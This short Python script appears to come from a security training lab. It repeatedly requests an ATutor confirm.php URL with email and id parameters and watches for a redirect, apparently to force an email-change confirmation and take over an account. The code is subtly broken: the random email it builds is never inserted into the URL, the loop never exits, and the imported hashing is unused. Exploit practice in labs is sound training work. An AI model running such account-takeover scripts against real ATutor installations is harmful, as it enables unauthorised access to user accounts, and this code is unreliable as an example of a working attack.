import hashlib, string, itertools, re, sys, requests,random
def update_email():
	while True:
		email = ''
		for i in range(3):
			email = email + chr(random.randint(97, 122))

		url = "http://atutor/ATutor/confirm.php?e=axt@offsec.local&m=0&id=1".format(email)

		r = requests.get(url, allow_redirects=False)
		if (r.status_code != 302):
			pass
		else:
			print("(*) Issuing update request to URL: {0}".format(url))
update_email()